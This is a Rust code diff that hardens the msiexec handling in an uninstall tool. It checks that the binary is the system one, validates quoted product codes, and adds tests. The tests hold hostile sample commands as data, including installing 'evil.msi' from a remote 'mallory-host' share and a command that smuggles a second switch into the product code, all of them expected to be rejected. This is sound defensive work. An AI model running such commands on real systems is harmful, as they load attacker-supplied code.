@@ -1621,6 +1621,25 @@ fn is_msiexec(path: &str) -> bool {
     file_name_lower(path) == "msiexec.exe"
 }
 
+/// Only the Windows Installer binaries shipped in System32/SysWOW64 count as
+/// msiexec; a renamed binary elsewhere must pass the regular trust checks.
+fn is_system_msiexec(path: &str) -> bool {
+    let Some(system_root) = std::env::var_os("SystemRoot") else {
+        return false;
+    };
+    let system_root = system_root.to_string_lossy();
+    let target = crate::winutil::canonicalize_path_safety(path)
+        .to_string_lossy()
+        .to_lowercase();
+    ["System32", "SysWOW64"].iter().any(|dir| {
+        let candidate = format!(r"{}\{}\msiexec.exe", system_root.trim_end_matches(['\\', '/']), dir);
+        crate::winutil::canonicalize_path_safety(&candidate)
+            .to_string_lossy()
+            .to_lowercase()
+            == target
+    })
+}
+
 /// msiexec may only remove or repair an installed product by its product code.
 /// Package paths (`/i \\host\share\x.msi`), transforms, logging and custom
 /// properties are rejected because they let the caller load arbitrary code.
@@ -1647,7 +1666,9 @@ fn validate_msiexec_arguments(arguments: &str) -> Result<(), String> {
             .or_else(|| lower.strip_prefix('-'))
             .unwrap_or("");
         let action_code = ["x", "i", "uninstall"].iter().find_map(|action| {
-            switch.strip_prefix(action).filter(|rest| rest.is_empty() || rest.starts_with('{'))
+            switch
+                .strip_prefix(action)
+                .filter(|rest| rest.is_empty() || rest.starts_with('{') || rest.starts_with("\"{"))
         });
 
         if let Some(code) = action_code {
@@ -1658,7 +1679,7 @@ fn validate_msiexec_arguments(arguments: &str) -> Result<(), String> {
             } else {
                 token.get(token.len() - code.len()..).unwrap_or("")
             };
-            if !is_msi_product_code(code) {
+            if !is_msi_product_code(strip_matching_quotes(code)) {
                 return reject(token);
             }
         } else if !ALLOWED_SWITCHES.contains(&switch) && !is_reboot_property(&lower) {
@@ -1674,6 +1695,13 @@ fn validate_msiexec_arguments(arguments: &str) -> Result<(), String> {
         );
     }
     Ok(())
+}
+
+fn strip_matching_quotes(value: &str) -> &str {
+    value
+        .strip_prefix('"')
+        .and_then(|inner| inner.strip_suffix('"'))
+        .unwrap_or(value)
 }
 
 fn is_reboot_property(lower_token: &str) -> bool {
@@ -1772,6 +1800,12 @@ fn prepare_uninstall_command(cmd_str: &str, elevated: bool) -> Result<(String, S
     }
 
     if is_msiexec(&executable) {
+        if !is_system_msiexec(&executable) {
+            return Err(format!(
+                "Security Block: '{}' is not the Windows Installer from System32/SysWOW64.",
+                executable
+            ));
+        }
         validate_msiexec_arguments(&arguments)?;
         return Ok((executable, arguments));
     }
@@ -2774,6 +2808,9 @@ mod tests {
         assert!(validate_msiexec_arguments(&format!("/I{}", GUID)).is_ok());
         assert!(validate_msiexec_arguments(&format!("/i {} /qn /norestart", GUID)).is_ok());
         assert!(validate_msiexec_arguments(&format!("/x{} /quiet REBOOT=ReallySuppress", GUID)).is_ok());
+        assert!(validate_msiexec_arguments(&format!("/X\"{}\" /qn", GUID)).is_ok());
+        assert!(validate_msiexec_arguments(&format!("/I \"{}\"", GUID)).is_ok());
+        assert!(validate_msiexec_arguments("/I \"\\\\host\\x.msi\"").is_err());
 
         assert!(validate_msiexec_arguments("").is_err());
         assert!(validate_msiexec_arguments("/i \\\\mallory-host\\share\\evil.msi /qn").is_err());
@@ -2792,6 +2829,7 @@ mod tests {
         assert!(prepare_uninstall_command("msiexec.exe /i \\\\mallory-host\\share\\evil.msi /qn", true).is_err());
         assert!(prepare_uninstall_command("MsiExec.exe /X{A /i C:\\x.msi}", true).is_err());
         assert!(prepare_uninstall_command("planted_tool.exe /S", false).is_err());
+        assert!(!is_system_msiexec(r"C:\Users\Public\msiexec.exe"));
 
         let (exe, args) = prepare_uninstall_command(&format!("MsiExec.exe /X{} /qn", GUID), true).unwrap();
         assert!(std::path::Path::new(&exe).is_absolute());
